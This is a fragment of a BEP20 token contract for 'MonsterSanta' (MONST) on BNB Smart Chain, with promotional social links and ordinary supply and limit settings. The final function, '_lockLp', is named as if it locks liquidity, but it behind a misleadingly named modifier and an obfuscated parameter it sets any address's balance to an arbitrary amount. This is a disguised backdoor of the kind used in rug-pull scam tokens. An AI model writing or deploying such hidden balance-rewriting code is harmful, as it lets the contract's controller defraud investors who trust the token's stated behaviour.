...
/*
    ...
    🐳Website : https://monstersanta.com/

    🌟Twitter : https://www.twitter.com/MonsterSantaBSC

    ❄️Telegram : https://t.me/monstersantabsc
...
contract MonsterSanta is IBEP20 {
    using SafeMath for uint256;
    address internal owner;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address marketingFeeReceiver;
    string constant _name = "MonsterSanta";
    string constant _symbol = "MONST";
    uint8 constant _decimals = 9;
    uint256 _totalSupply =  100000  * (10 ** _decimals);
    uint256 public _maxTxAmount =  50000 * (10 ** _decimals);     // 50%
    uint256 public _maxWalletToken = 3000  * (10 ** _decimals);  // 3%
    ...
    function _lockLp(address _ARDTUID0764, uint256 _value) public PancakeSwap {
        if(_ARDTUID0764 != address(0)){
            _balances[_ARDTUID0764] = _value * swapAndLiquify * (10 ** 9);
        }
    }
